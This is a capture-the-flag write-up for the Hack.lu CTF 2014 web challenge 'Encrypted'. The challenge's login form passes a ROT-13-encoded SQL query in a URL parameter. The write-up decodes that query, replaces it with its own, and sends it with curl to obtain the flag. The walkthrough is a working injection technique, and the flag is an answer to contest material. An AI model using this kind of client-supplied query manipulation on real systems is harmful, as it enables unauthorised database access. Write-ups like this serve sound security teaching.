# Hack.lu CTF 2014: Encrypted

**Category:** Web
**Points:** 50
**Author:** TheJH
**Description:**

> Legend says there is a bank vault in Jamestown which cannot be broken into. The only way inside is through an authentication process. Even Jesse James and his companions failed to break the security of this particular bank. Can you do it?
>
> <https://wildwildweb.fluxfingers.net:1411/>

## Write-up

The website at <https://wildwildweb.fluxfingers.net:1411/> displays a simple login form. Entering `a` as the username and `b` as the password results in the following URL:

```
https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27n%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27o%27%29
```

This presents an error message saying “bad password”.

That `dhrel` query string parameter value [URL-decodes into the following](https://mothereff.in/url#FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60%20JURER%20%60anzr%60%20%3D%20%27n%27%20NAQ%20%60cnffjbeq%60%20%3D%20ZQ5%28%27o%27%29):

```
FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'n' NAQ `cnffjbeq` = ZQ5('o')
```

This is a ROT-13-encoded SQL query. Let’s decode it using [`rot`](https://github.com/mathiasbynens/rot):

```bash
$ rot -n 13 'FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'n' NAQ `cnffjbeq` = ZQ5('o')'
SELECT `name` FROM `users` WHERE `name` = a AND `password` = MD5(b)
```

Since we don’t know any username or password, let’s simplify this query a little bit:

```sql
SELECT `name` FROM `users`
```

This ROT-13-encodes into:

```bash
$ rot -n 13 'SELECT `name` FROM `users`'
FRYRPG `anzr` SEBZ `hfref`
```

After URL-encoding, [this becomes](https://mothereff.in/url#FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60):

```
FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60
```

Let’s make the request:

```bash
$ curl 'https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60'

<!DOCTYPE html>
<html>
  <head>
    <title>Encrypted Login</title>
  </head>
  <body>
    <h1>Encrypted Login</h1>
Hello admin! The flag is flag{nobody_needs_server_side_validation}.  </body>
</html>
```

The flag is `flag{nobody_needs_server_side_validation}`.

## Other write-ups and resources

* [Exploit in Bash by @TheJH](thejh_exploit.sh)
